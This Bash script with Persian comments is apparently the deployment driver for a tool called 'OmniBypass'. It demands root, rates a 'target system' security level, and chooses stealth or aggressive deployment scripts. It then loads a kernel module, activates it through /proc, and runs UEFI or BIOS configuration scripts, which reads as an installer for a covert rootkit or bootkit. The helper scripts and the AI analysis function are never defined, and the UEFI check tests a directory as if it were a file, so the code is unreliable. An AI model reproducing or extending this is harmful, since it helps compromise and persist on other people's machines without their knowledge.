#!/bin/bash
# سیستم استقرار هوشمند OmniBypass

if [ "$(id -u)" -ne 0 ]; then
    echo "[-] نیاز به دسترسی root"
    exit 1
fi

# تحلیل سیستم هدف
SECURITY_LEVEL=$(ai_analyze_system)
echo "[*] سطح امنیت سیستم: $SECURITY_LEVEL"

# انتخاب استراتژی استقرار
if [ $SECURITY_LEVEL -ge 8 ]; then
    STRATEGY="stealth"
elif [ $SECURITY_LEVEL -ge 5 ]; then
    STRATEGY="aggressive"
else
    STRATEGY="normal"
fi

# اجرای استراتژی انتخابی
case $STRATEGY in
    stealth)
        echo "[*] اجرای استراتژی استیلث"
        ./deploy_stealth.sh
        ;;
    aggressive)
        echo "[*] اجرای استراتژی تهاجمی"
        ./deploy_aggressive.sh
        ;;
    normal)
        echo "[*] اجرای استراتژی عادی"
        ./deploy_normal.sh
        ;;
esac

# فعال‌سازی سیستم هوش مصنوعی
echo "[*] فعال‌سازی سیستم تصمیم‌گیری هوشمند"
insmod core/ai_controller.ko
echo 1 > /proc/omni/activate_ai

# پیکربندی پویا
if [ -f "/sys/firmware/efi" ]; then
    echo "[*] پیکربندی برای سیستم UEFI"
    ./configure_uefi.sh
else
    echo "[*] پیکربندی برای سیستم BIOS"
    ./configure_bios.sh
fi

echo "[+] استقرار OmniBypass با موفقیت انجام شد"
